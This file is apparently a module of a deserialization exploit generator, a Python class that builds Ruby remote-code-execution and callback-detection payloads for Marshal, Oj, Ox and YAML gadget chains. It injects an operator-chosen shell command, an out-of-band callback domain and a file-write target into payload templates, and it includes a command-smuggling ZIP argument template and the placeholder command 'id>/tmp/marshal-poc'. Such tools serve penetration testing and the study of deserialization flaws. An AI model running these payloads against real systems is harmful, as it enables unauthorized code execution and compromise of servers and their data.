
import os
import logging
import urllib.parse
import shutil
from .serializer import Serializer

class Ruby(Serializer):

    usage = 'Usage: ruby'

    gadgets = []

    def __init__(self, rubyPath, payloadPath, chainOpts):
        self.rubyPath = rubyPath
        self.payloadPath = payloadPath

        super().__init__(rubyPath, chainOpts)

        self.addGadget('marshal-rce-ruby-3.2.4', 'rce', 'marshal/3.2.4/marshal-rce-ruby-3.2.4.rb', 'binary')
        self.addGadget('marshal-rce-ruby-3.4-rc', 'rce', 'marshal/3.4-rc/marshal-rce-ruby-3.4-rc.rb', 'binary')
        self.addGadget('oj-detection-ruby-3.3', 'http-get', 'oj/3.3/oj-detection-ruby-3.3.json', 'json')
        self.addGadget('oj-rce-ruby-3.3', 'rce', 'oj/3.3/oj-rce-ruby-3.3.json', 'json')
        self.addGadget('ox-detection-ruby-3.3', 'http-get', 'ox/3.3/ox-detection-ruby-3.3.xml', 'xml')
        self.addGadget('ox-rce-ruby-3.3', 'rce', 'ox/3.3/ox-rce-ruby-3.3.xml', 'xml')
        self.addGadget('yaml-detection-ruby-3.3', 'http-get', 'yaml/3.3/yaml-detection-ruby-3.3.yml', 'yaml')
        self.addGadget('yaml-rce-ruby-3.3', 'rce', 'yaml/3.3/yaml-rce-ruby-3.3.yml', 'yaml')
        
    
    def addGadget(self, name, type, file, format):
        self.gadgets.append({
            'id': name,
            'name': name,
            'description': f'{name}: {type} {format}',
            'type': type,
            'file': file,
            'output': format,
        })

    def exists(self):
        result = super().exists()
        if not result:
            return False

        if not os.path.isdir(self.payloadPath):
            logging.error(f"Payload directory {self.payloadPath} does not exists")
            return False
        
        return True
    
    def chains(self):
        return self.gadgets
    

    def generate(self, chains):

        if len(chains) == 0:
            return 0

        system_command = self.chainOpts.system_command
        interact_domain = self.chainOpts.interact_domain
        remote_file_to_write = self.chainOpts.remote_file_to_write
        remote_content = self.getFileContentOrCode(self.chainOpts.remote_content) if self.chainOpts.remote_content is not None else '%%chain_id%%'
    
        logging.info(f"Interact domain: {interact_domain}")
        logging.info(f"System command: {system_command}")
        logging.info(f"File written on remote server: {remote_file_to_write}")
        logging.info(f"Content written on server: {remote_content}")

        # create an empty file that will contain JSP and Python file with the payload
        fp = self.createTemporaryFile(suffix='.rb')
        if fp == None:
            return 0

        logging.info(f"Generating payloads...")

        # generate payload for each chain
        count = 0
        for chain in chains:

            filePath = os.path.join(self.payloadPath, chain['file'])

            if not os.path.isfile(filePath):
                logging.warning(f"[{chain['name']}] Skipping chain because payload file {filePath} does not exit")
                continue

            if self.chainOpts.format != None and self.chainOpts.format != chain['output']:
                logging.debug(f"[{chain['name']}] Skipping chain of format '{chain['output']}'")
                continue

            logging.info(f"[{chain['name']}] Generating payload")

            with open(filePath, 'r') as f:
                content = f.read()

            if '{CALLBACK_URL}' in content and not interact_domain:
                logging.warning(f"[{chain['name']}] Skipping payload because it requires an interact domain")
                continue
                
            chain_system_command = system_command
            chain_system_command = chain_system_command.replace('%%chain_id%%', chain['id'])
            chain_system_command = chain_system_command.replace('%%domain%%', str(interact_domain))
            #chain_system_command = chain_system_command.replace("'", "\\'")
            # we are already in a \" escaped chain
            chain_system_command = chain_system_command.replace("\"", "\\\\\\\"")

            chain_remote_content = remote_content
            chain_remote_content = chain_remote_content.replace('%%chain_id%%', chain['id'])

            content = content.replace('$(id>/tmp/marshal-poc)', chain_system_command)
            content = content.replace('{ZIP_PARAM}', f'-TmTT=\\\"$({chain_system_command})\\\"any.zip')
            content = content.replace('{CALLBACK_URL}?', f"{chain['id']}.{interact_domain}/{chain['id']}?")
            content = content.replace('url = ""', f"url=\"{chain['id']}.{interact_domain}/\"")

            if filePath.endswith('.rb'):
                with open(fp.name, mode='w') as ft:
                    ft.write(content)

                result = self.payload(fp.name, '')

                if result.returncode != 0:
                    logging.error(f"[{chain['name']}] Failed to create payload")
                    if result.stderr != b'':
                        logging.error(result.stderr.decode('ascii'))
                    if result.stdout != b'':
                        logging.error(result.stdout.decode('ascii'))
                    continue

                payload = result.stdout

            else:
                payload = content.encode('ascii')

            if payload is None:
                logging.error(f"[{chain['name']}] Failed to create payload")
                continue

            logging.debug(f"[{chain['name']}] Payload generated with {len(payload)} bytes")

            # binary formatters can be encoded
            if chain['output'] == 'binary':
                # output of binary ruby payload is hexdump and this is the last line
                # there is print garbadge at the beginning
                # browse output backwards
                for line in reversed(payload.split(b'\n')):
                    if line.strip() != b'':
                        payload = bytes.fromhex(line.decode())
                        break
            else:
                # clean string style formatters to have 1 payload per line
                if not self.chainOpts.one_file_per_payload:
                    payload = payload.decode('ascii').replace('\r', '').replace('\n', '').encode('ascii')

            payload = self.encode(payload)
            
            self.output(chain['id'], payload+b"\n")
            count = count + 1
                
        return count